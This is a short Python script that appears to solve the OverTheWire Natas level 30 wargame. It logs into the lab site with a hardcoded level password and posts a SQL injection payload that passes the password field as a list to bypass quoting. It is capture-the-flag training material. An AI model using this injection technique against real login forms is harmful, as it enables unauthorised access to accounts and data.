import requests
import re

username = "natas30"
passsowrd = "Gz4at8CdOYQkkJ8fJamc11Jg5hOnXM9X"
url = "http://%s.natas.labs.overthewire.org/"%username

session = requests.Session()
response = session.post(url , data={"username" : "natas31" , "password" : [ "'anything' or 1" , 2 ] },auth=(username,passsowrd))
content = response.text

print(content)